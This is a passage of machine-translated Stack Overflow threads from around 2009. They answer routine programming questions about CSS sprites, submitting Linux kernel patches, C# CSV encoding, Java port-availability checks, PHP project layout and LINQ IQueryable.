第 4 点我完全同意，但是如果你只是将图像隐藏在精灵图像的集合中，你会得到什么？您可以对此进行辩论，但是 an`<img>`具有表示具有 URI 的资源的语义含义，因此 URI 应该是不同的，而不是依赖于解释的 CSS。查看/复制/保存图像将受到负面影响。

它在我的 FF 中的反应似乎也很慢（诚然，这会受到标签滥用的影响），我想剪裁数学需要付出相当大的努力。

长话短说，我认为现有的背景图像/位置技术是优越的。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2009-01-14T18:06:19.317

好的，这是我的研究发现的（如果我错了，请纠正我）： IE 支持 a:hover，但它显然不会将其应用于子元素。

因此，我使用您当前的标记创建了一个使用溢出：隐藏和边距的解决方法。我推测您仍然可以使用 clip 属性，但它可能需要另一个元素（尽管可能不需要）。解决方案在[这里](http://www.jennifersemtner.com/wp-content/uploads/2009/1/menu.html)，似乎在 FF 和 IE6 中都能正常工作（尚未在其他浏览器中测试）。

另外，我想对 anakata 说，菜单按钮和徽标在历史上并不是背景图像，而是打印在打印输出上，因此 css spriting 改变了这种行为（有利于性能）。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2009-01-12T07:45:07.200

你用的是什么IE版本？

`:hover`不应该在较旧的 IE 上工作（IE7 应该支持这个伪类）。

这篇“ [IE CSS Hover Fix](http://lawrence.ecorp.net/inet/samples/css-ie-hover1.shtml) ”一文列出了一些用来让`:hover`IE正确运行的技术，比如IE专有的表达式功能，或者HTC（HTML Component）。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2009-01-12T07:49:57.830

实际上，IE 支持 :hover 链接。我相信这里的问题是使用'Clip' css 属性。我建议寻找另一种解决方案，这是很常见的事情，调试它可能需要更长的时间才能尝试不同的方法。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2009-01-14T18:18:20.243

以下是我通常如何在 A 标签中制作没有 IMG 子标签的 CSS 精灵：

HTML：

```
<div class="menu">
    <a href="#">foo</a>
    <a href="#">foo</a>
</div> 
```

CSS：

```
/* you need to specify its height and width so that they fit with the part of the sprite you want to show */
.menu a{display:block;width: 100px; height: 100px; float:left; margin-right: 10px; text-indent: -9999px;}
/* the background-position is set to top. */
.menu a{background: url(../images/whatever.png) no-repeat top center;} 
/* the background-position is set to bottom. */
.menu a:hover{background-position: bottom center;} 
```

您的whatever.png 文件在两种状态下的高度均为200px。

就是这样

# linux - 如何向 Linux 内核提交潜在的补丁？

> ID：434711
> 
> 赞同：17
> 
> 时间：2009-01-12T07:31:13.000
> 
> 标签：linux, kernel, patch

我们有一些软件依赖于另一个（**非常**常用的）应用程序的某些行为，这些应用程序现在已经改变，使我们当前的实现可行，但不是最优的。

我们相信这一变化可能影响了许多其他应用程序，特别是在性能监控领域，我们已经找到了一个我们认为可以改善一系列其他潜在问题的解决方案。

不幸的是，上述解决方案是内核更改（相对简单但如果我们把它塞进去会产生很大影响），我们没有提交内核补丁以供审查的经验。

SO上有没有人真的提交了一个补丁（虽然我很感激所有的答案，但我怀疑最好的答案来自那些已经通过这个过程的人，即使是不成功的）？您是否已接受它（Alan Cox 等人在 SO 上徘徊的机会有多大）？

正确的流程是什么？我不打算向 Linus 发送电子邮件，因为我知道他有一群保护者，你应该在它到达他之前通过这些保护者。我如何找出谁负责内核的特定部分。

可能是我过于乐观地认为内核世界从未听说过的人可以做出贡献，但我很想知道。

* * *

编辑更多细节：

更改实际上并不是针对性能错误，而是（在我看来）对进程终止时写入的进程会计条目（当前）的改进。

Websphere App Server（啊，IBM，祝福他们的小心脏）已经改变了它的工作；JVM 过去常常定期退出，以便写入它们的条目，我们可以将其用于退款。现在它让 JVM 闲置了几个月，这意味着除非我们定期强制关闭 WAS，否则无法及时获得数据。不知何故，我认为 IBM 的软件部门不会为我们修复他们的软件 :-)。无论如何，我相信它对于其他长期存在的进程来说可能是一个有用的特性。

当前类型 3 进程记帐记录是在进程退出时写入的，我们正在研究的是一种在进程仍处于活动状态时定期写入类型 N 记录的机制，给出自上次写入以来的数字（或进程启动，如果这是第一次）。计费或性能监控应用程序可以选择使用类型 3 记录（完全未更改）或临时类型 N 记录。我们目前的解决方法是监视特定进程的 /proc/PID/stat ，但这是一个可怕的问题，因为它不能很好地与实际进程记帐集成。

不需要经常（我们很高兴有 24 小时），但可能会对性能产生影响，因为当前仅在进程 exit() 上完成的工作将不得不偶尔在进程上下文切换时完成。Linus 等人可能不喜欢这个想法，因为它可能是代码的高影响区域（即使检查自上次写入以来是否有 24 小时可能对他们来说太慢了）。

不过，感谢到目前为止所有的答案，我会看看我怎么走。给我几天，我会接受最好的答案。

* * *

## 回答 #1

> 赞同：14
> 
> 时间：2009-01-12T08:43:33.820

最重要的是：专注于性能错误报告，并正确处理（使用可重复的基准测试）至少可以帮助您让人们为问题烦恼。同样在测试后提交补丁，但要注意你的好补丁可能使用错误的方法，并且他们可能会写出更好的补丁。或者只是它可能很棒，但可能需要修复才能被接受，这甚至发生在超级家伙身上。并且不要想私下给某人发电子邮件，而是参考 LKML 或适当的子系统 ML。

我建议您在联系内核开发人员之前通读所有其他答案和所有适用材料；并阅读 SubmittingPatches 的参考书目。如果你做错了，他们可能会很严厉。kernelnewbies IRC 聊天是您开始的好地方，因为他们肯定很受欢迎，即使有时环境可能太像新手（不确定，我没去过那么多）。

> 可能是我过于乐观地认为内核世界从未听说过的人可以做出贡献，但我很想知道。

并不过分乐观。至少本身不是。从你那里抽象出来（因为我不知道你的技能），更不可能的是你的补丁会在没有修改的情况下被接受，或者它是根据正确的技能编写的。但实际上，如果您的补丁针对的是较小的社区，则可能会容易得多。

在考虑提交补丁之前，请有一些经验的人（即我）描述问题及其影响其他应用程序的原因。诸如“这提高了我们的性能”之类的考虑，尤其是如果您（模糊地）有资格成为供应商，对内核开发人员没有吸引力。

特别是，省略这样的陈述：

> 使我们当前的实现可行，但不是最佳的。

因为这会立即得到大多数读者的“修复代码”建议。

如果现有应用程序（不是您编写的）的性能受到影响，那就不同了。例如，一旦 Linus 及时关注修复错误代码的内核性能，因为该代码是 make 的一部分，即使他为自己编写的代码和他不需要做的事实感到自豪那个确切的修复。即，您需要一个每个人都关心的应用程序，或者一个没有缺点的解决方案。所以，像这样的东西：

> 来自另一个（非常常用的）应用程序的行为

很好，只要您对该应用程序的使用不被认为是不合理的。

最后，如果您参考源代码，他们可能会要求查看感兴趣的部分 - 如果您的代码存在许可问题，请考虑许可问题，如果您想快速回答，请提前解决其中任何问题。

顺便说一句，这是我在那里的经历的部分描述： [https ://www.ohloh.net/accounts/Blaisorblade](https://www.ohloh.net/accounts/Blaisorblade)

如果你愿意，你可以联系我直接帮助你提供建议的邮件，并在讨论中抄送我。我很忙，但我可能会找到更多时间:-)。

* * *

## 回答 #2

> 赞同：13
> 
> 时间：2009-01-12T07:44:46.293

好吧，您可以尝试阅读linux 内核源代码树中的[Documentation/SubmittingPatches](http://lxr.linux.no/linux/Documentation/SubmittingPatches)。

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2009-01-12T07:54:57.163

在大型项目中，将补丁添加到主树中的最佳方法是联系维护特定代码段的人员。因此，请查看[Linux MAINTAINERS 文件](http://lxr.linux.no/linux/MAINTAINERS)以查看谁是您更改的代码的正式维护者，并查看[Linux 内核 SCM 存储库](http://git.kernel.org/?p=linux/kernel/git/torvalds/linux-2.6.git;a=summary)以找到最近处理该代码的开发人员。为了增加补丁被接受的机会：

*   确保您的补丁易于理解并遵循现有的代码和文档标准，
*   清楚地解释你的补丁实现了什么，
*   以适当的格式提交您的更改（Linux 的 diff -up 的输出），
*   确保补丁可以在最新的软件（Linux内核）版本上干净地应用（并且有效），
*   包括演示您正在解决的问题以及您的补丁如何解决它的测试用例，以及
*   不要在您的代码中包含无关的（例如格式）更改。

与引入边缘或可疑实用程序的新功能的大型代码更改相比，对已知错误的小修复更有可能被合并到项目中。在某些情况下，首先通过项目的问题跟踪数据库提交错误报告是值得的，然后提交解决特定问题的补丁。为避免失望，如果您正在考虑进行重大更改，最好在编写代码**之前与维护人员讨论更改和您提议的实现。**

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2009-01-12T08:41:33.887

阅读 Documentation/SubmittingPatches，找到合适的 MAINTAINER，最重要的是，发现所有讨论**真正**发生在哪里。它可能不在内核邮件列表本身，但可能在某些子系统 ML 上。

然后订阅此 ML，并将您的补丁作为 RFC 提交。

我不知道您的补丁是否具有侵入性，但请尝试将其拆分为逻辑更改队列，每个更改都有自己的解释。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2009-01-12T07:41:48.017

我没有尝试自己提交任何内核补丁，而且这方面的[文档也很缺乏](http://kernel.org/doc/#Submitting_Patches)。

但是[此页面](http://kernelnewbies.org/UpstreamMerge)看起来可以为您指明正确的方向。

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2009-01-13T18:33:47.280

在 EDIT 中，作为示例，答案可能很有趣。我想你的要求是完全合理的，但你是对的，即使是对上下文切换的测试也可能过于昂贵。但是由于内核有一个计时器实现，我不明白为什么不能用它来避免这种情况。因此，确实，提出增强请求是最安全的选择。我很惊讶建议发送错误报告而不是补丁非常合适。如果您想提交它，您也可以自己修改补丁以自己使用计时器，但仍准备好进行讨论:-) 您甚至可以添加“我们有一个本地修复，但它在上下文切换快速路径上添加了一些测试，这就是为什么附上补丁以供参考但不应应用的原因”。拒绝你自己的代码，如果它被认为是坏的，

另一种方法是运行一些基准测试并证明没有影响，但如果计时器可行，那么代码无论如何都会被拒绝，或者自己尝试计时器解决方案（可能存在更好的解决方案）。找到他们用于内核调度程序的基准；查看有关 CFS Ingo（或 Kolivas'？）补丁的“最近”线程并获取他们的基准。

关于支持，内核开发人员不会关心“Websphere App Server”本身，如果它做了不合理的事情，即使是 IBM 资助的事情。但是由于我对这种情况的了解有限，定期关闭 JVM 是没有意义的，这似乎只是掩盖一些内存泄漏/不稳定的一种方式，因此必须支持当前的行为。

# c# - 读取 CSV 文件编码错误

> ID：434715
> 
> 赞同：5
> 
> 时间：2009-01-12T07:37:12.283
> 
> 标签：c#, .net, encoding, csv, character-encoding

我正在使用以下方法读取 Csv 文件内容：

```
 /// <summary>
    /// Reads data from a CSV file to a datatable
    /// </summary>
    /// <param name="filePath">Path to the CSV file</param>
    /// <returns>Datatable filled with data read from the CSV file</returns>
    public DataTable ReadCsv(string filePath)
    {
        if (string.IsNullOrEmpty(filePath))
        {
            log.Error("Invalid CSV file name.");
            return null;
        }

        try
        {
            DataTable dt = new DataTable();

            string folder = FileMngr.Instance.ExtractFileDir(filePath);
            string fileName = FileMngr.Instance.ExtractFileName(filePath);
            string connectionString = 
            string.Concat(@"Driver={Microsoft Text Driver (*.txt; *.csv)};Dbq=",
            folder, ";");

            using (OdbcConnection conn = 
                   new System.Data.Odbc.OdbcConnection(connectionString))
            {
                string selectCommand = string.Concat("select * from [", fileName, "]");
                using (OdbcDataAdapter da = new OdbcDataAdapter(selectCommand, conn))
                {
                    da.Fill(dt);
                }
            }

            return dt;
        }
        catch (Exception ex)
        {
            log.Error("Error loading CSV content", ex);
            return null;
        }
    } 
```

如果我有一个带有*schema.ini的**UTF-8*编码的 Csv 文件，则此方法有效，如下所示：

 *```
[Example.csv]
Format=Delimited(,)
ColNameHeader=True
MaxScanRows=2
CharacterSet=ANSI 
```

*如果我在Unicode*编码的 Csv 文件中有德语字符，则该方法无法正确读取数据。

我可以对上述读取*Unicode* Csv 文件的方法进行哪些修改？如果没有办法这样做，你能建议什么 CSV 阅读代码？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2009-01-12T08:07:06.640

尝试`CharacterSet=UNICODE`在您的 schema.ini 文件中使用。虽然这[在 MSDN 上没有记录，](http://msdn.microsoft.com/en-us/library/ms709353.aspx)但它根据[Microsoft 论坛上的这个线程](http://social.microsoft.com/Forums/en-US/vblanguage/thread/0ab1db1a-bfc4-48b6-b31e-33242abf18b2)工作。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2009-01-12T07:40:30.187

[好吧， CodeProject 上](http://www.codeproject.com/KB/database/CsvReader.aspx)有一个非常好的和使用良好的流式 CSV 阅读器；这是我要尝试的第一件事......但听起来你的编码可能很糟糕，这可能不会让它变得简单......当然，它可能只是 odbc 正在破坏，在这种情况下上面可能会工作美好的。

对于简单的 CSV，您可以尝试自己解析它（`string.Split`等），但有足够的边缘情况值得使用预滚动解析器。

# java - 套接字：使用 Java 发现端口可用性

> ID：434718
> 
> 赞同：134
> 
> 时间：2009-01-12T07:38:18.337
> 
> 标签：java, sockets, port

如何使用 Java 以编程方式确定给定机器中端口的可用性？

即给定一个端口号，确定它是否已经被使用？

* * *

## 回答 #1

> 赞同：94
> 
> 时间：2009-01-12T14:31:54.040

这是来自 Apache [camel](http://camel.apache.org/)项目的[实现：](http://svn.apache.org/viewvc/camel/trunk/components/camel-test/src/main/java/org/apache/camel/test/AvailablePortFinder.java?view=markup#l130)

```
/**
 * Checks to see if a specific port is available.
 *
 * @param port the port to check for availability
 */
public static boolean available(int port) {
    if (port < MIN_PORT_NUMBER || port > MAX_PORT_NUMBER) {
        throw new IllegalArgumentException("Invalid start port: " + port);
    }

    ServerSocket ss = null;
    DatagramSocket ds = null;
    try {
        ss = new ServerSocket(port);
        ss.setReuseAddress(true);
        ds = new DatagramSocket(port);
        ds.setReuseAddress(true);
        return true;
    } catch (IOException e) {
    } finally {
        if (ds != null) {
            ds.close();
        }

        if (ss != null) {
            try {
                ss.close();
            } catch (IOException e) {
                /* should not be thrown */
            }
        }
    }

    return false;
} 
```

他们也在检查 DatagramSocket 以检查端口是否在 UDP 和 TCP 中可用。

希望这可以帮助。

* * *

## 回答 #2

> 赞同：41
> 
> 时间：2013-03-11T13:50:15.440

对于 Java 7，您可以使用 try-with-resource 获得更紧凑的代码：

```
private static boolean available(int port) {
    try (Socket ignored = new Socket("localhost", port)) {
        return false;
    } catch (IOException ignored) {
        return true;
    }
} 
```

* * *

## 回答 #3

> 赞同：38
> 
> 时间：2009-01-12T07:47:54.633

如果您不太关心性能，您可以随时尝试使用[ServerSocket](http://java.sun.com/j2se/1.4.2/docs/api/java/net/ServerSocket.html)类监听端口。如果它抛出异常，则它正在被使用。

```
public static boolean isAvailable(int portNr) {
  boolean portFree;
  try (var ignored = new ServerSocket(portNr)) {
      portFree = true;
  } catch (IOException e) {
      portFree = false;
  }
  return portFree;
} 
```

**编辑：**如果您要做的只是选择一个自由端口，那么`new ServerSocket(0)`会为您找到一个。

* * *

## 回答 #4

> 赞同：38
> 
> 时间：2012-12-11T18:21:42.160

从 Java 7 开始，[David Santamaria 的答案](https://stackoverflow.com/a/435579/298389)似乎不再可靠。但是，看起来您仍然可以可靠地使用 Socket 来测试连接。

```
private static boolean available(int port) {
    System.out.println("--------------Testing port " + port);
    Socket s = null;
    try {
        s = new Socket("localhost", port);

        // If the code makes it this far without an exception it means
        // something is using the port and has responded.
        System.out.println("--------------Port " + port + " is not available");
        return false;
    } catch (IOException e) {
        System.out.println("--------------Port " + port + " is available");
        return true;
    } finally {
        if( s != null){
            try {
                s.close();
            } catch (IOException e) {
                throw new RuntimeException("You should handle this error." , e);
            }
        }
    }
} 
```

* * *

## 回答 #5

> 赞同：11
> 
> 时间：2018-02-16T13:56:59.727

以下解决方案的灵感来自 Spring-core（Apache 许可）的[SocketUtils](https://github.com/spring-projects/spring-framework/blob/master/spring-core/src/main/java/org/springframework/util/SocketUtils.java)实现。

与使用`Socket(...)`它的其他解决方案相比，它非常快（在不到一秒的时间内测试 1000 个 TCP 端口）。

当然，它只能检测在所有接口上打开端口或在 localhost 上显式运行的服务。

```
public static boolean isTcpPortAvailable(int port) {
    try (ServerSocket serverSocket = new ServerSocket()) {
        // setReuseAddress(false) is required only on OSX, 
        // otherwise the code will not work correctly on that platform          
        serverSocket.setReuseAddress(false);
        serverSocket.bind(new InetSocketAddress(InetAddress.getByName("localhost"), port), 1);
        return true;
    } catch (Exception ex) {
        return false;
    }
} 
```

* * *

## 回答 #6

> 赞同：3
> 
> 时间：2013-03-12T18:34:57.313

基于 try/catch 套接字的解决方案可能不会产生准确的结果（套接字地址是“localhost”，并且在某些情况下，端口可能不会被环回接口“占用”，至少在 Windows 上我已经看到此测试失败，即prot 被错误地声明为可用）。

有一个很酷的库，名为[SIGAR](https://github.com/hyperic/sigar)，下面的代码可以帮你搞定：

```
Sigar sigar = new Sigar();
int flags = NetFlags.CONN_TCP | NetFlags.CONN_SERVER | NetFlags.CONN_CLIENT;             NetConnection[] netConnectionList = sigar.getNetConnectionList(flags);
for (NetConnection netConnection : netConnectionList) {
   if ( netConnection.getLocalPort() == port )
        return false;
}
return true; 
```

* * *

## 回答 #7

> 赞同：3
> 
> 时间：2019-03-08T05:43:51.513

David Santamaria 指出的答案的清理：

```
/**
 * Check to see if a port is available.
 *
 * @param port
 *            the port to check for availability.
 */
public static boolean isPortAvailable(int port) {
    try (var ss = new ServerSocket(port); var ds = new DatagramSocket(port)) {
        return true;
    } catch (IOException e) {
        return false;
    }
} 
```

这仍然取决于 user207421 在对 David Santamaria 的回答的评论中指出的竞争条件（在此方法关闭`ServerSocket`and`DatagramSocket`并返回后，某些东西可能会抢占端口）。

* * *

## 回答 #8

> 赞同：1
> 
> 时间：2012-05-31T05:52:34.567

就我而言，它有助于尝试连接到端口 - 如果服务已经存在，它会响应。

```
 try {
        log.debug("{}: Checking if port open by trying to connect as a client", portNumber);
        Socket sock = new Socket("localhost", portNumber);          
        sock.close();
        log.debug("{}: Someone responding on port - seems not open", portNumber);
        return false;
    } catch (Exception e) {         
        if (e.getMessage().contains("refused")) {
            return true;
    }
        log.error("Troubles checking if port is open", e);
        throw new RuntimeException(e);              
    } 
```

* * *

## 回答 #9

> 赞同：0
> 
> 时间：2017-11-06T13:46:37.097

就我而言，我必须使用 DatagramSocket 类。

```
boolean isPortOccupied(int port) {
    DatagramSocket sock = null;
    try {
        sock = new DatagramSocket(port);
        sock.close();
        return false;
    } catch (BindException ignored) {
        return true;
    } catch (SocketException ex) {
        System.out.println(ex);
        return true;
    }
} 
```

不要忘记先导入

```
import java.net.DatagramSocket;
import java.net.BindException;
import java.net.SocketException; 
```

* * *

## 回答 #10

> 赞同：-2
> 
> 时间：2015-10-28T06:56:11.990

我已经尝试过这样的事情，它对我来说真的很好

```
 Socket Skt;
            String host = "localhost";
            int i = 8983; // port no.

                 try {
                    System.out.println("Looking for "+ i);
                    Skt = new Socket(host, i);
                    System.out.println("There is a Server on port "
                    + i + " of " + host);
                 }
                 catch (UnknownHostException e) {
                    System.out.println("Exception occured"+ e);

                 }
                 catch (IOException e) {
                     System.out.println("port is not used");

                 } 
```

# php - 组织由 PHP、Smarty、JavaScript、MySQL 提供支持的网站的文件

> ID：434724
> 
> 赞同：2
> 
> 时间：2009-01-12T07:43:04.550
> 
> 标签：php, javascript, css, smarty

我正在编写一个由 PHP、Smarty、JavaScript、CSS、MySQL 提供支持的 Web 应用程序。

将有一些类，将在整个应用程序中使用。会有一些脚本会使用这些类。

关于如何为网站组织文件的任何好的文章、教程和架构？

PS 它应该包含如何组织所有文件（PHP、JavaScript、CSS、模板文件。）

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2009-01-12T08:17:24.233

请记住，不应通过 Web 服务器直接访问 PHP 库和模板文件。

您可以创建类名，如 My_Db_Table 并使用[__autoload](http://us.php.net/manual/en/language.oop5.autoload.php)加载它们。

```
/project
- /config
- /html
- - /css
- - /images
- - /js
- - /subdirs for php files unless you use apache mod_rewrite or similar
- - index.php
- - otherfiles.php
- /lib
- - /My
- - - /Db
- - - - Table.php
- /templates
- /functions
- /scripts 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-01-12T07:58:13.273

这里有两篇关于使用 Smarty 的 PHP 项目以及如何为它们设置文件结构的好文章：

[http://codepoets.co.uk/php5_application_directory_structure_ruby_on_rails](http://codepoets.co.uk/php5_application_directory_structure_ruby_on_rails)

[http://www.edit-x.com/editx-support-articles.php?s=&c=21&d=48&e=&f=&g=&a=11122&w=2](http://www.edit-x.com/editx-support-articles.php?s=&c=21&d=48&e=&f=&g=&a=11122&w=2)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-01-12T08:14:00.120

一个非常基本的文件夹布局：

```
root
 |
 |- htdocs       # apache documentroot (i.e. index.php etc.) here
 |   |
 |   |- styles   # css here
 |   |
 |   |- images
 |
 |- application  # classes etc. here
 |
 |- vendor
 |   |
 |   |- smarty   # smarty library files 
```

# c# - ungetc 相当于 c#

> ID：434734
> 
> 赞同：3
> 
> 时间：2009-01-12T07:48:34.167
> 
> 标签：c#, c

c# 中是否有与 C 的 stdio 函数 ungetc() 等效的函数？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2009-01-12T07:51:06.627

从来没听说过; 在某些情况下，您可以使用类似 a`StreamReader`和使用`Peek`?

```
 using(StreamReader reader = new StreamReader(stream))
        {
            /// ... lots of reading
            int i = reader.Peek();
            /// ... lots of reading
        } 
```

但是，我认为您不能将任意数据推回流中，除非您使用类似的东西`MemoryStream`，因此可以对数据进行猴子处理。

即使您有一个`Stream`既可读又可写（很少见）的光标，那么仍然只有一个光标，因此您需要在写入后小心重置位置（因此它也需要是可搜索的；同样，不常见); 但是，这并不可靠——某些流（例如 TCP 中的网络流）会将写入视为“将其发送到另一台机器”，并且它永远不会被读取返回。而且它是不可搜索的；-p

# linq - 如何向 IQueryable 变量添加新记录？

> ID：434737
> 
> 赞同：35
> 
> 时间：2009-01-12T07:50:19.920
> 
> 标签：linq, iqueryable

使用 LINQ 从我的数据库查询 IQueryable 结果，如何将新记录添加到 IQueryable 结果。

* * *

## 回答 #1

> 赞同：42
> 
> 时间：2009-01-12T07:58:04.410

您要将其添加到数据库中，还是仅添加到数据绑定等其他事物将使用的结果列表中？

如果是前者，则需要对正在使用的任何类型的 LINQ 使用正常的添加操作，但对表表示而不是 IQueryable。查询只读取数据。

如果是后者，请使用[Enumerable.Concat](http://msdn.microsoft.com/en-us/library/bb302894.aspx)将现有序列（IQueryable）与包含额外条目的新序列（在这里可以使用数组或列表）连接起来，并将结果用于绑定等。这可能值得首先使用 AsEnumerable() 以确保使用 Enumerable 而不是 Queryable。例如：

```
IQueryable<string> names = [...];
names = names.AsEnumerable().Concat(new[] { "(None)", "(Add new)" }); 
```

* * *

## 回答 #2

> 赞同：16
> 
> 时间：2009-01-12T07:55:53.963

您应该首先将其转换为列表；

```
IQueryable<int> foo = new SomeQueryable<int<();
List<int> list = foo.ToList();
list.Add(5); 
```

或使用 Concat

```
IQueryable<int> foo = new SomeQueryable<int<();
foo = foo.Concat(new int[]{5}); 
```

编辑：确定你必须重新分配 foo.

* * *

## 回答 #3

> 赞同：6
> 
> 时间：2009-02-18T03:21:30.320

The simple answer is that unless you add the record to the underlying datastore that the Iqueryable is querying, you *can't* add a new record into an IQueryable. So if you are using LinqToSql then you would have to add a row into the table that the IQueryable was querying in order to "add" a row into the IQueryable.

Remember that an IQueryable is not a result set, it is a query. Until you use something like .ToList() the IQueryable will not evaluate a result set and more importantly, the IQueryable doesn't hang on to that result set. It creates a list and puts the results into in instead. So that means that if you call ToList() on an Iqueryable twice, it will go off and query the database twice. It doesn't care that it might be inefficient.

So, if you look at the examples that others have used above, a simple change of AsEnumerable() to ToList() will most likely fix your problems.

Something like:

```
dcDataContext db = new dcDataContext();
var query = from c in db.tblSexes
              select new { c.SexCode, c.SexName };

var results = query.ToList().Concat(new[] { new { SexCode = -1, SexName = "Please select your Gender" } });

//or even better now that it's a list
var results = query.ToList().Add(new { SexCode = -1, SexName = "Please select your Gender" });

SelectList sliSex = new SelectList(results, "SexCode", "SexName"); 
```

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2015-09-15T08:32:30.877

这可能是一个非常古老的问题，我想在这里添加更多解释和示例

如果使用`IQueryable<YourObject>`，则必须将其转换为`IEnumerable<YourObject>`first

> 有关 IEnumerable 的附加详细信息：
> 
> [返回 IEnumerable<T> 与 IQueryable<T>](https://stackoverflow.com/questions/2876616/returning-ienumerablet-vs-iqueryablet)

经过

```
IQueryable<YourObject> iqueryResult = // ..... your LinQ or whatever
IEnumerable<YourObject> enumResult = iqueryResult.AsEnumerable(); 
```

然后，添加你可以通过

```
enumResult = enumResult.Concat(new[] {new YourObject()
                 { 
                    //.... 
                 } 
             }); 
```

真实代码示例

```
var iquery_QRDTR = from rrp in P_QCDTR
        select new WebRequestData
        {
             ros_chk_id = rrp.CHECKIN_ID,
             ros_img = rrp.EMPLOYEE_ASSOCIATE.IMAGE_URL
        };

var enum_QRDTR = iquery_QRDTR.AsEnumerable();

enum_QRDTR = enum_QRDTR.Concat(new[] {new WebRequestData()
             {
             ros_chk_id = 16,
             ros_img = "http://link.to.image/profile.jpg" 
             } }); 
```

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2011-11-20T19:13:49.610

尝试这个：

```
var query = from c in db.clClinics select c; 

var results = query.ToList().Concat(new clClinic[] { new clClinic()}); 
```

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2018-11-18T08:40:37.640

你可以使用联合

```
IQueryable<int> foo = new SomeQueryable<int>();
IQueryable<int> foo2 = new SomeQueryable<int>();
foo = foo.Union(foo2); 
```

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2009-01-12T09:24:43.347

显式设置匿名类型的属性。尝试这个：

```
dcDataContext db = new dcDataContext();
var results = from c in db.tblSexes
              select new { c.SexCode, c.SexName };
results = results.AsEnumerable().Concat(new[] { new { SexCode = -1, SexName = "Please select your Gender"} });
SelectList sliSex = new SelectList(results, "SexCode", "SexName"); 
```

**编辑：**您必须指出您的属性的确切类型。我的意思是如果它是 int 你必须指出它是。我猜 SexCode 是一个“long”，默认情况下 -1 是一个“int”。如果您将 -1 转换为 long（或 SexCode 的类型），问题将得到解决。

如果 SexCode 的类型很长，这是确切的解决方案。

```
dcDataContext db = new dcDataContext();
var results = from c in db.tblSexes
              select new { c.SexCode, c.SexName };
results = results.Concat(new[] { new { SexCode = -1L, SexName = "Please select your Gender"} });
SelectList sliSex = new SelectList(results, "SexCode", "SexName"); 
```

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2009-01-12T09:40:23.613

因为结果是 IQueryable 你应该投给它

```
 dcDataContext db = new dcDataContext();
var results = from c in db.tblSexes
              select new { c.SexCode, c.SexName };
results = results.AsEnumerable().Concat(new[] { new { SexCode = -1, SexName = "Please select your Gender"} }).AsQueryable();
SelectList sliSex = new SelectList(results, "SexCode", "SexName"); 
```

或者没有任何铸造

> results = results.Union(new[] { new { SexCode = -1, SexName = "请选择您的性别"} })

# ide - 您多久会容忍一次 IDE 崩溃？

> ID：434741
> 
> 赞同：2
> 
> 时间：2009-01-12T07:53:49.817
> 
> 标签：ide

我正在尝试从 vim 中的编码切换到 IDE 中的编码（在本例中为 Linux 上的 Anjuta），但我发现每次我崩溃 IDE 时，我对它的信任都会下降，直到崩溃率约为一次有一天，我对它的信任度如此之低，以至于使用它比使用简单的文本编辑器进行编码压力大得多。

在您不再信任它以使用它之前，您的 IDE 必须多久崩溃、失败或执行完全出乎意料的事情？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2009-01-12T08:23:26.933

我正在使用 Visual Studio 2008 以及所有新奇的优点（3.5、WPF、LINQ、...），尤其是 WPF 设计器（无论如何它都很糟糕）每隔一天就会崩溃。虽然这确实很烦人，但我没有任何市长数据丢失，并且我尝试通过不使用 WPF 设计器来解决它（我提到过它吗？——无论如何都糟透了）。

我认为这不是*信任*问题，而是 IDE（或任何类型的软件）是否真的为桌面带来了足够的功能，值得烦恼？这是一个非常个人的价值判断，对我来说这意味着：工作室，是的；WPF设计师，没有。相当容易。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-01-12T07:57:13.757

对我来说，一天一次太频繁了。

我也认为这个问题是无关紧要的。

**编辑：**顺便说一句，我目前主要做 Python 编程，我不使用 IDE，只是打开了多个命令行的文本编辑器。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2009-01-12T08:11:29.347

一句话—​​—“从不”。

我唯一一次使用 IDE 是在为 Android 编写代码时。除此之外，我使用 gvim 和命令行工具。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2009-01-12T08:00:04.097

多年来，我使用了很多 Visual Studio 的 beta 和 CTP 版本，由于这些都是未完成的软件，我不能指望它们能够稳定运行。

在这种情况下，提供良好的备份策略很重要。最新版本的 Visual Studio 允许您保存更改，即使是临时项目，即您尚未指定名称的项目。

不幸的是，当您在崩溃后重新启动 IDE 时，Visual Studio 会擦除所有临时项目。我可以理解他们为什么这样做，但就崩溃可恢复性而言，这是一个非常糟糕的决定。

除此之外，当谈到崩溃时，我真的不能容忍。这是我永远无法使用 Eclipse 的原因之一。IDE 有太多不符合我口味的任意错误，这真的让我抓狂。

现在，我主要使用 (G)VIM/mvim 并且几乎没有任何崩溃。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2009-01-12T08:20:09.063

每次 Visual Studio 2003 崩溃时，我都会低声发誓，但我似乎能够忍受......

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2009-01-12T08:36:44.693

我使用 IntelliJ IDEA，它很少在我身上崩溃。如果它每月崩溃一次以上，我会寻找其他地方和/或大声尖叫支持。

至少在 Intellij 上，它会自动为您保存工作并进行本地版本控制，因此您很少会因崩溃而丢失任何东西（我从未丢失过可以在几分钟内衡量的更多工作），而且如果您将某些事情弄得一团糟，您可以轻松恢复较旧的工作版本，我非常喜欢它，因为它不会污染“通用”存储库，频繁签入不一定能编译，更不用说工作只是为了确保你有一个回滚位置。

# visual-studio-2008 - 有没有办法在 Visual Studio 2008 中折叠经典 ASP 的函数和子例程？

> ID：434750
> 
> 赞同：1
> 
> 时间：2009-01-12T07:57:54.817
> 
> 标签：visual-studio-2008, ide, asp-classic, vbscript

